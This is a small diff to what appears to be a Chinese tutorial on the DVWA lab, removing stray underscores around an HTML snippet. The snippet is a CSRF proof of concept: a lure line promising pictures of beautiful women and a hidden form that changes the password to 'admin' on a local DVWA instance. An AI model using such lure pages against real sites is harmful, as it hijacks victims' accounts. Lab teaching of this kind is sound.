@@ -135,13 +135,13 @@ html代码如下：
 
 
 ```html
-_<p>美女图片，点击下方按钮查看</p>
+<p>美女图片，点击下方按钮查看</p>
 <form method="get" action="http://127.0.0.1/dvwa/vulnerabilities/csrf/">
   <input type="hidden" name="passwordnew" value="admin">
   <input type="hidden" name="passwordconf" value="admin">
   <input type="hidden" name="Change" value="Change">
   <input type="submit" name="" value="查看">
-</form>_
+</form>
 
 ```
 
